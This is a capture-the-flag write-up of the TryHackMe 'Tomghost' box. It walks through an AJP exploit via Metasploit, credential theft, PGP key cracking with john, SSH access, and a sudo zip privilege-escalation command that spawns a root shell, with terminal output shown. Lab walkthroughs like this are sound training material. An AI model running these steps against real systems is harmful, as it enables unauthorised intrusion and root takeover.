### THM Tomghost

Now we're going after a THM box called Tomghost.  Advanced warning, this box has some language so if that bothers or upsets you, please stop reading.

For those of you still here, let's get to it.

Nmap to start as always and looks like we've got a couple ports open.

22, 53, 8009, and 8080.

22 is ssh, 53 is dns.  8080 is an http server.  I end up finding out that 8009 is Apache JServ Protocol (AJP).  After some searching, I find on exploit-db that there's a metasploit option for this.  Fire it up and sure enough, I get a username and password.

![user account](/Images/THM8Tomghost/pic1.png)

Once I grabbed that, I was able to connect to the ssh and grab the user.txt file.

![user.txt](/Images/THM8Tomghost/pic2.png)

Once I got connected I was able to start poking around.  Doing some enumeration and found a couple files.  Using `scp` I was able to grab those files.

```
(kali@kali)-$ scp skyfuck@10.10.183.100:credential.pgp /home/kali/Documents/THM\ Tomghost 
skyfuck@10.10.183.100's password: 
credential.pgp                                                                                 100%  394     1.8KB/s   00:00    
                                                                                                                                 
(kali@kali)-$ scp skyfuck@10.10.183.100:tryhackme.asc /home/kali/Documents/THM\ Tomghost
skyfuck@10.10.183.100's password: 
tryhackme.asc                                                                                  100% 5144    23.0KB/s   00:00
```

Now that we have those files, lets get to accessing them.

Using `gpg2john` we take the .asc file and output it to `output`.  Then we cat out the `output` to make sure it did what it was supposed to do.

[pgp2john](/Images/THM8Tomghost/pic3.png)

Now that this is done, we run that output file through `john` like so...

[asc file](/Images/THM8Tomghost/pic4.png)

Once that's done, we can then decrypt that pgp hash.

[pgp decrypt](/Images/THM8Tomghost/pic4.png)

Wow, what a password.  Ok, now we have a new user and a password, let's try SSH and see if we can get in.

```
(kali@kali)-$ ssh merlin@10.10.183.100          
merlin@10.10.183.100's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ whoami
merlin
merlin@ubuntu:~$
```

And we're in.  Now let's see what we can do.

```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
```

With some help from GTFOBins, that was easy pz.  And that's another one rooted.  That's 3 today.  Let's keep it up, 2 more to go.

Thanks for coming along.  See you on the next one.

